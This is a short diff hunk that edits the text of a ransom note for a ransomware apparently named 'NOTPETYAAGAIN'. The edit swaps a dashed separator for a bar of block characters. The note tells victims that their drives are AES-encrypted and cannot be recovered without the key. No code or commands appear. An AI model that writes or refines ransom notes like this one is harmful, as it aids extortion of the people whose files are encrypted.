@@ -1,5 +1,5 @@
 OOPS! You became a victim of the NOTPETYAAGAIN RANSOMWARE!
-----------------------------------------------------------------------
+██████████████████████████████████████████████████████████████████████
 The drives of your computer have been encrypted with an advanced
 military grade encryption algorithm known as AES. It is not possible
 to regain access to your system without the use of the encryption key,
